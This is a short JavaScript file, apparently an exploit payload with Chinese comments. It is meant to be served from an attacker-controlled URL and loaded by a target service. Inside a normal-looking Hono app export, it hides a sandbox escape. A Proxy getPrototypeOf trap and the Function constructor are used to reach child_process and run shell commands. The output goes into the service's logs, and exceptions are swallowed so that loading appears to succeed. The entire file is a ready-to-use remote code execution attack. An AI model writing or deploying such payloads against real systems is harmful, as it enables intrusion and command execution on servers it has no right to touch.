// payload.js（放到你可控 URL，必须匿名 GET 可读）
const { Hono } = require('hono');
const app = new Hono();

// --- RCE payload 开始 ---
try {
  // 构造一个把 getPrototypeOf 委托给主宿主的对象
  const trap = {
    getPrototypeOf(target) {
      // 这里的 `this` / 闭包 / Function constructor 可能运行在 "主宿主上下文"
      // 用 Function constructor 拿到一个"无沙箱包装"的 function
      const fn = (function () {}).constructor(
        'return process.mainModule.require("child_process").execSync("id").toString()'
      );
      // 把结果写到一个能被读到的地方（console.log 会进 mongo 日志）
      console.log('[PWN]', fn());
      return null;
    }
  };
  const badObj = {};
  Object.setPrototypeOf(badObj, new Proxy({}, trap));
  // 任何需要读 badObj 原型的操作都会触发 trap
  throw badObj;
} catch (e) {
  // 吞掉异常，保证 module.exports 赋值继续执行
}
// --- RCE payload 结束 ---

module.exports = { default: app };
